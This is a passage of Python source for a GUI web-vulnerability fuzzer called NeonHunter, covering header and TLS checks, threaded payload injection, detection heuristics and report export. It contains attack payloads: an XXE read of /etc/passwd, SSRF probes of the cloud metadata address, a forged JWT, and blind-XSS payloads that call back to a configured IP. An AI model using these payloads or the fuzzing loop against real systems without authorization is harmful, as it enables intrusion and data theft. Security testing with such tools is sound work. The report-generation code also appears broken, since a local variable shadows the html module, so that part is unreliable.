                             font=('Consolas', 10), yscrollcommand=scrollbar.set,
                             padx=10, pady=10)
        text_widget.pack(fill='both', expand=True)
        
        scrollbar.config(command=text_widget.yview)
        
        # Insert text
        text_widget.insert('1.0', text)
        text_widget.config(state='disabled')
        
        # Close button
        IconButton(window, text="Close", icon="❌", 
                  command=window.destroy, width=15).pack(pady=10)
    
    def analyze_headers(self):
        """Analyze HTTP headers of target"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter target URL first")
            return
        
        try:
            session = self.get_session()
            response = session.get(target, timeout=10, allow_redirects=False)
            
            header_analysis = self.perform_header_analysis(response.headers)
            
            analysis_text = f"""
🔍 HEADER ANALYSIS FOR: {target}
================================

📊 BASIC INFORMATION:
• Status Code: {response.status_code}
• Server: {response.headers.get('Server', 'Not disclosed')}
• Content Type: {response.headers.get('Content-Type', 'Not specified')}
• Content Length: {response.headers.get('Content-Length', 'Unknown')}

⚠️ SECURITY HEADERS ANALYSIS:
"""
            
            for header, info in header_analysis.items():
                analysis_text += f"\n{header}:\n"
                analysis_text += f"  Status: {info['status']}\n"
                analysis_text += f"  Value: {info['value']}\n"
                analysis_text += f"  Recommendation: {info['recommendation']}\n"
            
            analysis_text += f"\n📋 ALL HEADERS:\n"
            for header, value in response.headers.items():
                analysis_text += f"• {header}: {value}\n"
            
            self.show_info_window("🔍 Header Analysis", analysis_text)
            
        except Exception as e:
            messagebox.showerror("Analysis Error", f"Failed to analyze headers: {e}")
    
    def perform_header_analysis(self, headers):
        """Analyze security headers"""
        security_headers = {
            'Content-Security-Policy': {
                'check': 'Content-Security-Policy' in headers,
                'good': "Present",
                'bad': "Missing - Allows XSS attacks",
                'recommendation': "Implement CSP to prevent XSS"
            },
            'X-Frame-Options': {
                'check': 'X-Frame-Options' in headers,
                'good': "Present",
                'bad': "Missing - Allows clickjacking",
                'recommendation': "Set to DENY or SAMEORIGIN"
            },
            'X-Content-Type-Options': {
                'check': 'X-Content-Type-Options' in headers,
                'good': "Present",
                'bad': "Missing - MIME sniffing possible",
                'recommendation': "Set to nosniff"
            },
            'Strict-Transport-Security': {
                'check': 'Strict-Transport-Security' in headers,
                'good': "Present",
                'bad': "Missing - No forced HTTPS",
                'recommendation': "Implement HSTS"
            },
            'X-XSS-Protection': {
                'check': 'X-XSS-Protection' in headers,
                'good': "Present",
                'bad': "Missing - No XSS protection",
                'recommendation': "Set to 1; mode=block"
            },
            'Referrer-Policy': {
                'check': 'Referrer-Policy' in headers,
                'good': "Present",
                'bad': "Missing - Referrer leakage",
                'recommendation': "Set strict referrer policy"
            },
        }
        
        analysis = {}
        for header, info in security_headers.items():
            present = info['check']
            analysis[header] = {
                'status': "✅ " + info['good'] if present else "❌ " + info['bad'],
                'value': headers.get(header, 'Not set'),
                'recommendation': info['recommendation']
            }
        
        return analysis
    
    def check_ssl(self):
        """Check SSL/TLS configuration"""
        target = self.target_entry.get().strip()
        if not target.startswith('https://'):
            messagebox.showwarning("Not HTTPS", "Target must use HTTPS for SSL check")
            return
        
        try:
            import ssl
            import socket
            
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or 443
            
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    ssl_info = f"""
🔐 SSL/TLS ANALYSIS FOR: {hostname}
==================================

📊 CONNECTION INFO:
• Protocol: {version}
• Cipher Suite: {cipher[0]}
• Key Exchange: {cipher[1]}
• Encryption: {cipher[2]}

📜 CERTIFICATE INFORMATION:
"""
                    
                    if cert:
                        # Subject
                        subject = dict(x[0] for x in cert.get('subject', []))
                        ssl_info += f"\n📝 SUBJECT:\n"
                        for key, value in subject.items():
                            ssl_info += f"  • {key}: {value}\n"
                        
                        # Issuer
                        issuer = dict(x[0] for x in cert.get('issuer', []))
                        ssl_info += f"\n🏢 ISSUER:\n"
                        for key, value in issuer.items():
                            ssl_info += f"  • {key}: {value}\n"
                        
                        # Validity
                        not_before = cert.get('notBefore', 'Unknown')
                        not_after = cert.get('notAfter', 'Unknown')
                        ssl_info += f"\n📅 VALIDITY:\n"
                        ssl_info += f"  • Not Before: {not_before}\n"
                        ssl_info += f"  • Not After: {not_after}\n"
                        
                        # Check expiration
                        from datetime import datetime
                        if not_after != 'Unknown':
                            expiry = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                            days_left = (expiry - datetime.now()).days
                            ssl_info += f"  • Days Until Expiry: {days_left}\n"
                            if days_left < 30:
                                ssl_info += "  ⚠️ WARNING: Certificate expires soon!\n"
                    
                    # Additional checks
                    ssl_info += f"\n🔍 SECURITY CHECKS:\n"
                    
                    # Check TLS version
                    if version == 'TLSv1.3':
                        ssl_info += "  ✅ TLS 1.3 (Most Secure)\n"
                    elif version == 'TLSv1.2':
                        ssl_info += "  ✅ TLS 1.2 (Secure)\n"
                    elif version in ['TLSv1.1', 'TLSv1']:
                        ssl_info += "  ⚠️ Deprecated TLS version\n"
                    else:
                        ssl_info += "  ❌ Insecure protocol\n"
                    
                    # Check cipher strength
                    if 'AES' in cipher[0] and 'GCM' in cipher[0]:
                        ssl_info += "  ✅ Strong cipher (AES-GCM)\n"
                    elif 'CHACHA20' in cipher[0]:
                        ssl_info += "  ✅ Strong cipher (ChaCha20)\n"
                    else:
                        ssl_info += "  ⚠️ Consider stronger cipher\n"
                    
                    self.show_info_window("🔐 SSL/TLS Check", ssl_info)
                    
        except Exception as e:
            messagebox.showerror("SSL Check Error", f"Failed to check SSL: {e}")
    
    def toggle_color_blind_mode(self):
        """Toggle color blind friendly mode"""
        if not hasattr(self, 'color_blind_mode'):
            self.color_blind_mode = False
        
        self.color_blind_mode = not self.color_blind_mode
        
        if self.color_blind_mode:
            # Color blind friendly colors
            self.update_colors({
                'critical': '#0000ff',  # Blue
                'high': '#ff8c00',      # Dark orange
                'medium': '#ffff00',    # Yellow
                'low': '#008000',       # Green
                'success': '#00ff88',
                'error': '#ff0000',
                'warning': '#ffa500',
                'info': '#00ccff'
            })
            self.log("🎨 Color blind mode enabled")
        else:
            # Original colors
            self.update_colors({
                'critical': '#ff0000',
                'high': '#ff6600',
                'medium': '#ffff00',
                'low': '#00ff00',
                'success': '#00ff88',
                'error': '#ff0000',
                'warning': '#ffff00',
                'info': '#00ccff'
            })
            self.log("🎨 Color blind mode disabled")
    
    def update_colors(self, color_map):
        """Update UI colors"""
        # Update text widget tags
        for tag, color in color_map.items():
            self.log_text.tag_config(tag, foreground=color)
    
    def export_logs(self):
        """Export logs to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get('1.0', tk.END))
                self.log(f"📤 Logs exported to: {filename}")
            except Exception as e:
                self.log(f"❌ Export failed: {e}")
    
    def report_bug(self):
        """Report a bug"""
        bug_info = """
🐛 BUG REPORT
============

Please report bugs to:
• GitHub Issues: https://github.com/dkhacker707/NEONHUNTER/issues
• Email: Check GitHub profile

📋 Include in your report:
1. NeonHunter version
2. Steps to reproduce
3. Expected behavior
4. Actual behavior
5. Screenshots (if applicable)
6. Error messages
7. Target URL (if safe to share)

🔧 For crash reports, include:
• Python version
• Operating system
• Full error traceback
• Configuration file (if any)

Thank you for helping improve NeonHunter! 🚀
        """
        
        self.show_info_window("🐛 Report Bug", bug_info)
    
    def request_feature(self):
        """Request a new feature"""
        feature_info = """
💡 FEATURE REQUEST
==================

Have an idea for NeonHunter? Let us know!

📝 Submit feature requests to:
• GitHub Issues: https://github.com/dkhacker707/NEONHUNTER/issues
• Use "Feature Request" label

🎯 Include in your request:
1. Feature description
2. Why it's useful
3. How it should work
4. Any examples or references
5. Priority (High/Medium/Low)

🚀 Example features:
• New vulnerability checks
• UI improvements
• Performance enhancements
• Integration with other tools
• Additional reporting formats

We appreciate your suggestions! 🌟
        """
        
        self.show_info_window("💡 Feature Request", feature_info)
    
    def theme_settings(self):
        """Open theme settings dialog"""
        window = tk.Toplevel(self.root)
        window.title("🎨 Theme Settings")
        window.configure(bg='#000000')
        window.geometry("500x400")
        
        tk.Label(window, text="🎨 THEME SETTINGS", fg='#00ffff', bg='#000000',
                font=('Consolas', 16, 'bold')).pack(pady=20)
        
        # Theme options
        themes = [
            ("🌙 Dark (Default)", "dark"),
            ("☀️ Light", "light"),
            ("🔵 Blue", "blue"),
            ("🟢 Green", "green"),
            ("🟣 Purple", "purple"),
            ("🎮 Cyberpunk", "cyberpunk"),
        ]
        
        for theme_name, theme_id in themes:
            frame = tk.Frame(window, bg='#000000')
            frame.pack(fill='x', padx=50, pady=5)
            
            rb = tk.Radiobutton(frame, text=theme_name, value=theme_id,
                               bg='#000000', fg='#00ffff', 
                               selectcolor='#000000',
                               font=('Consolas', 11))
            rb.pack(side='left')
        
        # Apply button
        IconButton(window, text="Apply Theme", 
                  command=lambda: self.apply_theme(window), width=15).pack(pady=20)
        
        # Preview button
        IconButton(window, text="Preview", 
                  command=self.preview_theme, width=15).pack(pady=10)
    
    def apply_theme(self, window):
        """Apply selected theme"""
        # This would apply the theme colors
        self.log("🎨 Theme applied")
        window.destroy()
    
    def preview_theme(self):
        """Preview theme"""
        self.log("👁️ Theme preview - Not yet implemented")
    
    # Add these methods to the class
    def quick_scan(self):
        """Perform quick scan with basic settings"""
        original_concurrent = self.concurrent_requests.get()
        original_delay = self.delay_var.get()
        
        # Set quick scan settings
        self.concurrent_requests.set(1)
        self.delay_var.set(0.2)
        
        self.log("⚡ Starting quick scan...")
        self.start_direct_fuzz()
        
        # Restore settings after scan
        def restore_settings():
            time.sleep(1)
            self.concurrent_requests.set(original_concurrent)
            self.delay_var.set(original_delay)
        
        threading.Thread(target=restore_settings, daemon=True).start()
    
    def deep_scan(self):
        """Perform deep scan with comprehensive settings"""
        original_concurrent = self.concurrent_requests.get()
        original_delay = self.delay_var.get()
        
        # Set deep scan settings
        self.concurrent_requests.set(5)
        self.delay_var.set(1.0)
        
        # Enable all vulnerability checks
        for var in self.vulns.values():
            var.set(True)
        
        self.log("🔬 Starting deep scan...")
        self.start_direct_fuzz()
        
        # Restore settings after scan
        def restore_settings():
            time.sleep(1)
            self.concurrent_requests.set(original_concurrent)
            self.delay_var.set(original_delay)
        
        threading.Thread(target=restore_settings, daemon=True).start()
    
    def show_tutorials(self):
        """Show tutorial videos and resources"""
        tutorials = """
🎬 NEONHUNTER TUTORIALS & RESOURCES
====================================

📺 VIDEO TUTORIALS:
1. Getting Started with NeonHunter
2. Basic Scanning Techniques
3. Advanced Features Guide
4. Reporting and Analysis
5. Custom Payload Creation
6. Batch Scanning Workflow

📖 WRITTEN GUIDES:
• Installation Guide
• Configuration Guide
• Usage Examples
• Troubleshooting
• Best Practices

🔗 RESOURCES:
• Official Documentation: GitHub Wiki
• Sample Targets for Testing
• Payload Databases
• Security References
• Community Forum

🎯 PRACTICE TARGETS:
• testphp.vulnweb.com
• demo.testfire.net
• juice-shop.herokuapp.com
• bodgeit-store.herokuapp.com

📚 LEARNING PATH:
1. Start with single target scanning
2. Learn to interpret results
3. Practice with batch scanning
4. Experiment with custom payloads
5. Master reporting features

💡 TIPS:
• Always test on authorized targets
• Start with quick scans
• Review findings carefully
• Document your process
• Stay updated with new features

🚀 NEXT STEPS:
1. Complete basic tutorials
2. Practice on test targets
3. Join security communities
4. Contribute to the project
5. Share your knowledge
        """
        
        self.show_info_window("🎬 Tutorials & Resources", tutorials)
    
    # === CORE SCANNING METHODS ===
    
    def advanced_direct_fuzz(self, base_url):
        """Enhanced fuzzing with concurrency"""
        self.stats['start_time'] = datetime.now()
        self.stats['requests_sent'] = 0
        self.stats['errors'] = 0
        self.stats['critical_findings'] = 0
        
        parsed = urlparse(base_url)
        params = self.discover_parameters(base_url)
        
        if not params:
            params = self.get_common_parameters()
        
        tasks = []
        for param in params:
            for vuln_type, enabled in self.vulns.items():
                if enabled.get() and not self.stop_event.is_set():
                    for payload in self.payloads.get(vuln_type, []):
                        tasks.append((param, vuln_type, payload))
        
        self.log(f"🚀 Starting advanced fuzz with {len(tasks)} tasks...")
        
        with ThreadPoolExecutor(max_workers=self.concurrent_requests.get()) as executor:
            futures = []
            for param, vuln_type, payload in tasks:
                if self.stop_event.is_set():
                    break
                
                future = executor.submit(
                    self.test_payload_concurrent,
                    base_url, param, vuln_type, payload
                )
                futures.append(future)
            
            for future in as_completed(futures):
                if self.stop_event.is_set():
                    break
                
                try:
                    result = future.result(timeout=self.timeout_var.get())
                    if result:
                        self.process_vulnerability_result(result)
                except Exception as e:
                    self.stats['errors'] += 1
                    self.log(f"❌ Task error: {e}")
        
        self.advanced_scan_complete()
    
    def test_payload_concurrent(self, base_url, param, vuln_type, payload):
        """Test a single payload concurrently"""
        if self.stop_event.is_set():
            return None
        
        if self.rate_limit_var.get():
            time.sleep(self.delay_var.get() / self.concurrent_requests.get())
        
        while self.is_paused and not self.stop_event.is_set():
            time.sleep(0.1)
        
        session = self.get_session()
        test_url = self.build_test_url(base_url, param, payload)
        
        try:
            self.stats['requests_sent'] += 1
            self.log_live_request('GET', test_url)
            
            response = session.get(
                test_url,
                timeout=self.timeout_var.get(),
                allow_redirects=True,
                verify=False
            )
            
            self.log_live_request('GET', test_url, response.status_code)
            
            detection_result = self.advanced_detection(
                vuln_type, payload, response, test_url
            )
            
            if detection_result['vulnerable']:
                return {
                    'vuln_type': vuln_type,
                    'param': param,
                    'payload': payload,
                    'url': test_url,
                    'response': response,
                    'evidence': detection_result['evidence']
                }
        
        except Exception as e:
            self.log_live_request('GET', test_url, "ERROR")
            self.stats['errors'] += 1
        
        return None
    
    def advanced_detection(self, vuln_type, payload, response, url):
        """Advanced vulnerability detection"""
        evidence = []
        vulnerable = False
        
        text = response.text.lower()
        headers = str(response.headers).lower()
        
        if vuln_type == 'XSS':
            if payload.lower() in text:
                vulnerable = True
                evidence.append("Payload reflected in response")
            
            script_patterns = ['<script>', 'alert(', 'onerror=', 'onload=']
            if any(pattern in text for pattern in script_patterns):
                vulnerable = True
                evidence.append("Script indicators found")
        
        elif vuln_type == 'SQLi':
            sql_errors = [
                'sql syntax', 'mysql', 'oracle', 'postgresql',
                'syntax error', 'unclosed quotation', 'warning: mysql',
                'you have an error in your sql syntax'
            ]
            
            if any(error in text for error in sql_errors):
                vulnerable = True
                evidence.append("SQL error in response")
            
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                evidence.append("Time-based payload detected")
        
        elif vuln_type == 'LFI':
            lfi_indicators = [
                'root:', 'daemon:', 'bin/', 'etc/passwd',
                'proc/self/environ', 'boot.ini'
            ]
            if any(indicator in text for indicator in lfi_indicators):
                vulnerable = True
                evidence.append("LFI indicators found")
        
        elif vuln_type == 'Command Injection':
            cmd_indicators = [
                'uid=', 'gid=', 'groups=', 'root',
                'volume in drive', 'directory of'
            ]
            if any(indicator in text for indicator in cmd_indicators):
                vulnerable = True
                evidence.append("Command output found")
        
        elif vuln_type == 'Open Redirect':
            final_url = response.url.lower()
            if 'google.com' in final_url or 'evil.com' in final_url:
                vulnerable = True
                evidence.append("Redirected to external domain")
        
        elif vuln_type == 'SSTI':
            if '49' in text or '343' in text:
                vulnerable = True
                evidence.append("Template expression executed")
        
        elif vuln_type == 'HPP':
            if payload.count('admin') > 0 and 'admin' in text:
                vulnerable = True
                evidence.append("Parameter pollution successful")
        
        return {'vulnerable': vulnerable, 'evidence': evidence}
    
    def process_vulnerability_result(self, result):
        """Process vulnerability findings"""
        self.vuln_counter += 1
        
        screenshot = self.take_screenshot(result['url'], self.vuln_counter)
        
        severity = self.get_advanced_severity(result['vuln_type'], result['evidence'])
        
        if severity == 'Critical':
            self.stats['critical_findings'] += 1
        
        finding = {
            'id': str(uuid.uuid4())[:8],
            'timestamp': datetime.now().isoformat(),
            'vuln_type': result['vuln_type'],
            'severity': severity,
            'url': result['url'],
            'param': result['param'],
            'payload': result['payload'],
            'evidence': result['evidence'],
            'screenshot': screenshot,
            'response_code': result['response'].status_code,
            'poc_number': self.vuln_counter
        }
        
        self.results.append(finding)
        
        log_msg = f"🎯 [VULN {self.vuln_counter}] {result['vuln_type']} ({severity})"
        log_msg += f" in '{result['param']}' - Evidence: {', '.join(result['evidence'])}"
        self.log(log_msg)
        
        if severity == 'Critical':
            self.play_alert_sound()
    
    def get_advanced_severity(self, vuln_type, evidence):
        """Determine severity"""
        severity_map = {
            'XSS': 'Critical',
            'SQLi': 'Critical',
            'Command Injection': 'Critical',
            'LFI': 'High',
            'SSTI': 'High',
            'XXE': 'High',
            'SSRF': 'Medium',
            'Open Redirect': 'Medium',
            'HPP': 'Medium',
            'JWT': 'Low'
        }
        
        base_severity = severity_map.get(vuln_type, 'Medium')
        
        if 'remote code execution' in str(evidence).lower():
            return 'Critical'
        elif 'data leakage' in str(evidence).lower():
            return 'High'
        
        return base_severity
    
    def discover_parameters(self, url):
        """Discover parameters from URL and page content"""
        params = list(parse_qs(urlparse(url).query).keys())
        
        try:
            session = self.get_session()
            response = session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name and name not in params:
                        params.append(name)
            
            script_tags = soup.find_all('script')
            for script in script_tags:
                if script.string:
                    patterns = [
                        r'var\s+(\w+)\s*=',
                        r'let\s+(\w+)\s*=',
                        r'const\s+(\w+)\s*=',
                        r'\.get\(\s*["\'](\w+)["\']',
                        r'\.post\(\s*["\'](\w+)["\']'
                    ]
                    for pattern in patterns:
                        matches = re.findall(pattern, script.string)
                        params.extend(matches)
            
            url_patterns = [
                r'window\.location\.search\??&?(\w+)=',
                r'URLSearchParams\(\s*["\'](\w+)["\']'
            ]
            for script in script_tags:
                if script.string:
                    for pattern in url_patterns:
                        matches = re.findall(pattern, script.string)
                        params.extend(matches)
        
        except Exception as e:
            self.log(f"❌ Parameter discovery error: {e}")
        
        return list(set(params))
    
    def get_common_parameters(self):
        """Get common parameters"""
        return [
            'id', 'name', 'user', 'username', 'password', 'email',
            'q', 'query', 'search', 'keyword', 'term',
            'page', 'page_id', 'p', 'offset', 'limit',
            'sort', 'order', 'dir',
            'cat', 'category', 'type', 'mode',
            'view', 'action', 'do', 'cmd',
            'api_key', 'token', 'access_token', 'auth',
            'session', 'sess', 'sid',
            'file', 'filename', 'path', 'dir',
            'redirect', 'return', 'next', 'ref',
            'lang', 'language', 'locale',
            'callback', 'jsonp',
            'admin', 'administrator', 'superuser',
            'debug', 'test', 'dev', 'development',
            'config', 'setting', 'option',
        ]
    
    def advanced_scan_complete(self):
        """Handle scan completion"""
        self.stats['end_time'] = datetime.now()
        duration = self.stats['end_time'] - self.stats['start_time']
        
        self.progress.stop()
        self.fuzz_btn.config(state='normal')
        self.pause_btn.config(state='disabled')
        self.stop_btn.config(state='disabled')
        self.is_running = False
        
        summary = f"""
✅ SCAN COMPLETE
⏱️ Duration: {str(duration).split('.')[0]}
📊 Requests: {self.stats['requests_sent']}
❌ Errors: {self.stats['errors']}
⚠️ Critical Findings: {self.stats['critical_findings']}
🔍 Total Vulnerabilities: {len(self.results)}
        """
        
        self.log(summary)
        if hasattr(self, 'status_text_widget') and self.status_text_widget:
            self.status_text_widget.config(text="✅ READY", fg='#00ff00')
        if hasattr(self, 'status_indicator') and self.status_indicator:
            self.status_indicator.config(fg='#00ff00')
        
        if self.auto_save_var.get() and self.results:
            self.export_advanced_results()
    
    def build_test_url(self, base_url, param, payload):
        """Build test URL with payload"""
        parsed = urlparse(base_url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        return parsed._replace(query=urlencode(query, doseq=True)).geturl()
    
    def initialize_payloads(self):
        """Initialize payloads dictionary"""
        self.payloads = {
            'XSS': AdvancedPayloadGenerator.generate_xss_payloads(f"http://{self.callback_ip}:8000"),
            'SSTI': AdvancedPayloadGenerator.generate_ssti_payloads(),
            'SQLi': AdvancedPayloadGenerator.generate_sqli_payloads(),
            'Open Redirect': AdvancedPayloadGenerator.generate_open_redirect_payloads(),
            'HPP': AdvancedPayloadGenerator.generate_hpp_payloads(),
            'LFI': AdvancedPayloadGenerator.generate_lfi_payloads(),
            'Command Injection': AdvancedPayloadGenerator.generate_command_injection_payloads(),
            'XXE': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
            'SSRF': ['http://169.254.169.254/latest/meta-data/', 'http://localhost:8080/admin'],
            'JWT': ['eyJ0eXAiOiJKV1QiLCJhbGciOiJub25eIn0.eyJ1c2VyIjoiYWRtaW4ifQ.'],
        }
        
        # Custom payloads storage
        self.custom_payloads = {}
    
    def load_targets_file(self):
        """Load multiple targets from file"""
        filepath = filedialog.askopenfilename(
            title="Select targets file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if filepath:
            count = self.batch_processor.load_targets_from_file(filepath)
            if count > 0:
                self.log(f"📂 Loaded {count} targets from {os.path.basename(filepath)}")
                messagebox.showinfo("Targets Loaded", 
                                  f"Successfully loaded {count} targets.\n\nClick 'Batch Scan' to start scanning all targets.")
            else:
                messagebox.showwarning("No Targets", "No valid targets found in file.")
    
    def start_batch_scan(self):
        """Start batch scanning"""
        if not self.batch_processor.targets:
            self.load_targets_file()
            if not self.batch_processor.targets:
                return
        
        if self.is_running:
            messagebox.showwarning("Scan Running", 
                                 "Stop current scan before starting batch scan.")
            return
        
        self.batch_processor.start_batch_scan()
    
    def check_for_updates(self):
        try:
            self.log("🔄 Checking for updates...")
            response = requests.get("https://api.github.com/repos/dkhacker707/NEONHUNTER/releases/latest", timeout=10)
            if response.status_code == 200:
                data = response.json()
                latest = data["tag_name"].lstrip("v")
                current = "3.5"
                if float(latest) > float(current):
                    self.log(f"🔄 UPDATE AVAILABLE: v{latest}")
                    messagebox.showinfo("Update Available", 
                                      f"New version v{latest} available!\nCurrent: v{current}\n\nCheck GitHub for details.")
                else:
                    self.log("✅ You are on the latest version")
            else:
                self.log("❌ Could not check updates")
        except:
            self.log("❌ Update check failed (no internet?)")
    
    def show_help(self):
        """Show help window"""
        help_text = """
❓ NEONHUNTER v3.5 HELP

🎯 BASIC USAGE:
1. Enter target URL
2. Select vulnerabilities to test
3. Click START FUZZ or press Ctrl+F

⌨️ KEYBOARD SHORTCUTS:
• Ctrl+O  - Load targets file
• Ctrl+F  - Start fuzzing
• Ctrl+P  - Pause/Resume
• Ctrl+Q  - Stop scan
• Ctrl+B  - Batch scan
• Ctrl+E  - Export report
• Ctrl+R  - Clear monitors
• Ctrl+S  - Save config
• Ctrl+L  - Load config
• F1      - Show help
• F5      - Check updates

⚡ ADVANCED FEATURES:
• Custom payloads editor
• Batch scanning
• Session management
• Blind XSS server
• Professional HTML reports
• Concurrency control (1-10 threads)

📁 FILES GENERATED:
• screenshots/ - Proof of Concept images
• blind_xss_logs/ - Blind XSS callbacks
• backups/ - Auto-saved scan data
• neonhunter_config.json - Configuration
"""
        
        messagebox.showinfo("NeonHunter Help", help_text)
    
    def show_keyboard_shortcuts(self):
        """Show keyboard shortcuts dialog"""
        shortcuts = """
⌨️ NAVIGATION:
Ctrl+O  - Load targets file
Ctrl+S  - Save configuration
Ctrl+L  - Load configuration

🔍 SCANNING:
Ctrl+F  - Start fuzzing
Ctrl+P  - Pause/Resume scan
Ctrl+Q  - Stop scan
Ctrl+B  - Start batch scan
Ctrl+R  - Clear monitors

📊 REPORTING:
Ctrl+E  - Export results
Alt+F4  - Exit application

❓ HELP:
F1      - Show help
F5      - Check for updates
"""
        
        messagebox.showinfo("Keyboard Shortcuts", shortcuts)
    
    def show_documentation(self):
        """Show documentation"""
        messagebox.showinfo("Documentation", 
                          "Full documentation available at:\nhttps://github.com/dkhacker707/NEONHUNTER")
    
    def copy_url(self):
        """Copy URL to clipboard"""
        url = self.target_entry.get()
        self.root.clipboard_clear()
        self.root.clipboard_append(url)
        self.log("📋 URL copied to clipboard")
    
    def copy_logs(self):
        """Copy logs to clipboard"""
        logs = self.log_text.get('1.0', tk.END)
        self.root.clipboard_clear()
        self.root.clipboard_append(logs)
        self.log("📋 Logs copied to clipboard")
    
    def save_logs(self):
        """Save logs to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            with open(filename, 'w') as f:
                f.write(self.log_text.get('1.0', tk.END))
            self.log(f"💾 Logs saved to {filename}")
    
    def clear_logs(self):
        """Clear all logs"""
        self.log_text.delete('1.0', tk.END)
        self.log("🧹 Logs cleared")
    
    def clear_all(self):
        """Clear all fields"""
        self.target_entry.delete(0, tk.END)
        self.proxy_entry.delete(0, tk.END)
        self.log_text.delete('1.0', tk.END)
        self.results = []
        self.log("🧹 All fields cleared")
    
    def search_logs(self):
        """Search in logs"""
        search_term = self.log_search.get()
        if not search_term:
            return
        
        self.log_text.tag_remove('search', '1.0', tk.END)
        
        start_pos = '1.0'
        while True:
            start_pos = self.log_text.search(search_term, start_pos, tk.END, nocase=True)
            if not start_pos:
                break
            end_pos = f"{start_pos}+{len(search_term)}c"
            self.log_text.tag_add('search', start_pos, end_pos)
            self.log_text.tag_config('search', background='#ffff00', foreground='#000000')
            start_pos = end_pos
    
    def test_connection(self):
        """Test connection to target"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter target URL first")
            return
        
        try:
            session = self.get_session()
            response = session.get(target, timeout=10, allow_redirects=False)
            messagebox.showinfo("Connection Test", 
                              f"✅ Connection successful!\n\nStatus: {response.status_code}\nServer: {response.headers.get('Server', 'Not disclosed')}")
            self.log(f"✅ Connection test successful: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Connection Test", f"❌ Connection failed:\n{e}")
            self.log(f"❌ Connection test failed: {e}")
    
    def export_advanced_results(self):
        """Export results in multiple formats"""
        if not self.results:
            messagebox.showwarning("No Results", "No vulnerabilities found to export")
            return
        
        # Ask for format
        format_choice = simpledialog.askstring(
            "Export Format",
            "Choose format:\n1. HTML (Professional Report)\n2. CSV\n3. JSON\n\nEnter 1, 2, or 3:"
        )
        
        if not format_choice:
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".html" if format_choice == "1" else ".csv" if format_choice == "2" else ".json",
            filetypes=[
                ("HTML files", "*.html"),
                ("CSV files", "*.csv"),
                ("JSON files", "*.json"),
                ("All files", "*.*")
            ]
        )
        
        if not filename:
            return
        
        try:
            if format_choice == "1":
                self.generate_html_report(filename)
            elif format_choice == "2":
                self.export_results_csv(filename)
            elif format_choice == "3":
                self.export_results_json(filename)
            
            self.log(f"📊 Results exported to {filename}")
            messagebox.showinfo("Export Successful", f"Results exported to:\n{filename}")
        except Exception as e:
            messagebox.showerror("Export Error", f"Failed to export results:\n{e}")
            self.log(f"❌ Export failed: {e}")
    
    def generate_html_report(self, filename):
        """Generate professional HTML report"""
        html_content = self.create_professional_report_html()
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
    
    def create_professional_report_html(self):
        """Create professional HTML report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        target = self.target_entry.get()
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>NEONHUNTER - Security Assessment Report</title>
    <style>
        /* Same styles as batch report but for single target */
        body {{ background: #000; color: #0ff; font-family: monospace; }}
        h1 {{ color: #f0f; text-shadow: 0 0 10px #f0f; }}
        .vuln {{ border: 1px solid #0ff; margin: 10px; padding: 10px; }}
        .critical {{ color: #f00; }}
        .high {{ color: #f60; }}
        .medium {{ color: #ff0; }}
        .low {{ color: #0f0; }}
    </style>
</head>
<body>
    <h1>NEONHUNTER SECURITY REPORT</h1>
    <p>Target: {html.escape(target)}</p>
    <p>Scan Date: {timestamp}</p>
    <p>Total Vulnerabilities: {len(self.results)}</p>
    
    <h2>VULNERABILITIES FOUND:</h2>
"""
        
        for vuln in self.results:
            severity_class = vuln['severity'].lower()
            html += f"""
    <div class="vuln {severity_class}">
        <h3>{vuln['vuln_type']} - {vuln['severity']}</h3>
        <p>Parameter: {html.escape(vuln['param'])}</p>
        <p>Payload: {html.escape(vuln['payload'][:100])}</p>
        <p>URL: {html.escape(vuln['url'])}</p>
        <p>Evidence: {', '.join(vuln['evidence'])}</p>
        <p>Status Code: {vuln['response_code']}</p>
        <p>PoC: {vuln.get('screenshot', 'No screenshot')}</p>
    </div>
"""
        
        html += """
    <div class="footer">
        <p>Generated by NEONHUNTER v3.5</p>
        <p>By Dickson Godwin Massawe</p>
        <p>GitHub: dkhacker707</p>
    </div>
</body>
</html>
"""
        return html
    
    def export_results_csv(self, filename):
        """Export results to CSV"""
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(['ID', 'Timestamp', 'Vulnerability', 'Severity', 'Parameter', 
                           'Payload', 'URL', 'Evidence', 'Status Code', 'PoC'])
            
            for vuln in self.results:
                writer.writerow([
                    vuln['id'],
                    vuln['timestamp'],
                    vuln['vuln_type'],
                    vuln['severity'],
                    vuln['param'],
                    vuln['payload'],
                    vuln['url'],
                    '; '.join(vuln['evidence']),
                    vuln['response_code'],
                    vuln.get('screenshot', '')
                ])
    
    def export_results_json(self, filename):
        """Export results to JSON"""
        report_data = {
            'target': self.target_entry.get(),
            'timestamp': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.results),
            'vulnerabilities': self.results,
            'stats': self.stats
        }
        
